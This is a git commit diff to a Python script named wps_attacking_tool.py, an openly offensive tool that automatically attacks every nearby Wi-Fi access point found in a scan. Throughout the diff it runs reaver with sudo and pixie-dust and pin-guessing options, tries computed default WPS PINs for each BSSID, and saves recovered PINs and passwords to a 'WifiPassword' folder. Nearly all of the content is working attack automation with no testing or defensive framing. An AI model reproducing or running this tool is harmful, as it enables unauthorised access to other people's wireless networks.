472ebb0ba5d332ef2564df4793bec40682a40bd7
Alemaoozinho <36922235+Alemaoozinho@users.noreply.github.com>
2020-08-11 17:05:46 +0100

    Add files via upload

--- python/wps.sh
+++ python/wps.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 SCRIPTPATH="$( cd "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )"
-ola="/wps.py"
+ola="/wps_attacking_tool.py"
 python3 $SCRIPTPATH$ola 
--- python/wps_attacking_tool.py
+++ python/wps_attacking_tool.py
@@ -6,6 +6,12 @@ import csv
 import fileinput
 from termcolor import colored
 
+def is_integer(value: str, *, base: int=10) -> bool:
+    try:
+        int(value, base=base)
+        return True
+    except ValueError:
+        return False
 
 os.system('clear')
 print("Interfaces:\nPlease pick one:\n\n")
@@ -46,42 +52,49 @@ for row in range(len(my_list)):
    if not "BSSID" in my_list[row][0]:
     if not "Station" in my_list[row][0]:
      if not "----" in my_list[row][0]:
-      if not "2.0  Yes" in my_list[row][0]:
-       print("Attacking: " +my_list[row][-1])
-       if not os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
-        subprocess.call(["echo 'Y\n' | sudo timeout -k 5 "+timeout_attack+" reaver -i "+interface+"mon"+" -b "+my_list[row][0]+"-v -K -Z -L -S --no-nacks --ignore-locks -c "+my_list[row][4]+" | tee  "+ os.path.dirname(__file__)+"/Wifi Password/"+my_list[row][-1]+".txt"],shell=True)
-       with open( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") as f:
-        if "[+] WPS pin:" in f.read():
-         print("Success")
-        else:
-          try:
-           if os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
-            os.remove( os.path.dirname(__file__)+'/'+my_list[row][-1]+'.txt') 
-          except:
-           pass
-       os.system('clear')
+      print("Attacking: " +my_list[row][-1])
+      if not os.path.isfile( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"):
+       if is_integer(my_list[row][4]) is True:
+        subprocess.call(["echo 'Y\n' | sudo timeout -k 5 "+timeout_attack+" reaver -i "+interface+"mon"+" -b "+my_list[row][0]+" -v -K -Z -L --no-nacks --ignore-locks -c "+my_list[row][4]+" | tee  "+ os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"],shell=True)
+       if is_integer(my_list[row][3]) is True:
+        subprocess.call(["echo 'Y\n' | sudo timeout -k 5 "+timeout_attack+" reaver -i "+interface+"mon"+" -b "+my_list[row][0]+" -v -K -Z -L --no-nacks --ignore-locks -c "+my_list[row][3]+" | tee  "+ os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"],shell=True)
+      with open( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt") as f:
+       if "[+] WPS pin:" in f.read() or "executing pixiewps" in f.read() :
+        print("Success")
+       else:
+         try:
+          if os.path.isfile( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"):
+           os.remove( os.path.dirname(__file__)+'/WifiPassword/'+my_list[row][-1]+'.txt') 
+         except:
+          pass
+      os.system('clear')
  except:
   pass
-time.sleep(5)
+
+os.system('clear')
 for row in range(len(my_list)):
  try:
   if row:
    if not "BSSID" in my_list[row][0]:
     if not "Station" in my_list[row][0]:
      if not "----" in my_list[row][0]:
-      if not "2.0  Yes" in my_list[row][0]:
-       if not os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
+       if not os.path.isfile( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"):
         mac_pin = os.popen('echo "'+ my_list[row][0]+'" |python3 '+os.path.dirname(__file__)+'/wpspin.py')
         print("Attacking: " +my_list[row][-1])
         mac_pin_clean=mac_pin.read().rstrip("\n")
-        subprocess.call(["echo 'Y\n' | sudo timeout -k 5 10m reaver -i "+interface+"mon"+" -b "+my_list[row][0]+" -p "+mac_pin_clean+" -v -K -Z -L -S --no-nacks --ignore-locks -c "+my_list[row][4]+" | tee  "+ os.path.dirname(__file__)+"/Wifi Password/"+my_list[row][-1]+".txt"],shell=True)
-       with open( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") as f:
-        if "[+] WPS pin:" in f.read():
+        print(is_integer(my_list[row][4]))
+        print("Using WPS pin: "+mac_pin_clean)
+        if is_integer(my_list[row][4]) is True:
+         subprocess.call(["echo 'Y\n' | sudo timeout -k 5 5m reaver -i "+interface+"mon"+" -p "+mac_pin_clean+" -b "+my_list[row][0]+" -v -K -Z -L --no-nacks --ignore-locks -c "+my_list[row][4]+" | tee  "+ os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"],shell=True)
+        if is_integer(my_list[row][3]) is True:     
+         subprocess.call(["echo 'Y\n' | sudo timeout -k 5 10m reaver -i "+interface+"mon"+" -p "+mac_pin_clean+" -b "+my_list[row][0]+" -v -K -Z -L --no-nacks --ignore-locks -c "+my_list[row][3]+" | tee  "+ os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"],shell=True)     
+       with open( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt") as f:
+        if "[+] WPS pin:" in f.read() or "executing pixiewps" in f.read() :
          pass
         else:
           try:
-           if os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
-            os.remove( os.path.dirname(__file__)+'/'+my_list[row][-1]+'.txt') 
+           if os.path.isfile( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"):
+            os.remove( os.path.dirname(__file__)+'/WifiPassword/'+my_list[row][-1]+'.txt') 
           except:
            pass
        os.system('clear')
@@ -99,7 +112,7 @@ for row in range(len(my_list)):
    if not "BSSID" in my_list[row][0]:
     if not "Station" in my_list[row][0]:
      if not "----" in my_list[row][0]:
-      if os.path.isfile(os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink(os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
+      if os.path.isfile(os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt") or os.path.islink(os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"):
        print(my_list[row][-1]+colored(" Success", 'green'))
       else:
        print(my_list[row][-1]+colored(" Failed", 'red'))
